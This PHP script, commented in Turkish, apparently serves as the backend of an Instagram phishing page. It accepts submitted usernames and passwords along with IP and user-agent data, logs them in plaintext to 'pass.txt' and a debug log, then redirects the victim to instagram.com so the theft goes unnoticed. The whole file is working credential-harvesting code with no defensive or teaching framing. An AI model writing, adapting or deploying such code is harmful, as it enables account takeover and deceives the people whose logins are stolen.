<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

// Hata raporlamayı aç
error_reporting(E_ALL);
ini_set('display_errors', 1);

// POST verilerini al
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';
$ip_address = $_POST['ip_address'] ?? '';
$user_agent = $_POST['user_agent'] ?? '';
$timestamp = $_POST['timestamp'] ?? '';

// Güvenlik önlemi: HTML tag'lerini temizle
$username = htmlspecialchars($username, ENT_QUOTES, 'UTF-8');
$password = htmlspecialchars($password, ENT_QUOTES, 'UTF-8');
$ip_address = htmlspecialchars($ip_address, ENT_QUOTES, 'UTF-8');
$user_agent = htmlspecialchars($user_agent, ENT_QUOTES, 'UTF-8');

// Verileri kontrol et
if (empty($username) || empty($password)) {
    echo json_encode(['success' => false, 'message' => 'Kullanıcı adı ve şifre gereklidir.']);
    exit;
}

// Dosyaya kaydetme fonksiyonu
function saveToFile($data) {
    $filename = 'pass.txt';
    
    // Dosya mevcut değilse oluştur ve başlık ekle
    if (!file_exists($filename)) {
        $header = "Timestamp | IP Address | User Agent | Username | Password\n";
        $header .= "==========================================================\n";
        file_put_contents($filename, $header, FILE_APPEND | LOCK_EX);
    }
    
    // Veriyi formatla
    $logEntry = sprintf(
        "%s | %s | %s | %s | %s\n",
        $data['timestamp'],
        $data['ip_address'],
        substr($data['user_agent'], 0, 50) . '...', // Uzun user agent'ı kısalt
        $data['username'],
        $data['password']
    );
    
    // Dosyaya yaz
    if (file_put_contents($filename, $logEntry, FILE_APPEND | LOCK_EX)) {
        return true;
    } else {
        return false;
    }
}

// Kaydedilecek veriyi hazırla
$data = [
    'timestamp' => $timestamp,
    'ip_address' => $ip_address,
    'user_agent' => $user_agent,
    'username' => $username,
    'password' => $password
];

// Dosyaya kaydet
if (saveToFile($data)) {
    // Başarılı yanıt
    echo json_encode([
        'success' => true, 
        'message' => 'Veriler başarıyla kaydedildi.',
        'redirect' => 'https://www.instagram.com'
    ]);
} else {
    // Hata yanıtı
    echo json_encode([
        'success' => false, 
        'message' => 'Dosyaya yazılırken hata oluştu.'
    ]);
}

// Debug için ek bilgi (isteğe bağlı)
file_put_contents('debug.log', 
    "[" . date('Y-m-d H:i:s') . "] " . 
    "Username: $username, " .
    "IP: $ip_address, " .
    "User Agent: " . substr($user_agent, 0, 100) . "\n", 
    FILE_APPEND | LOCK_EX
);
?>
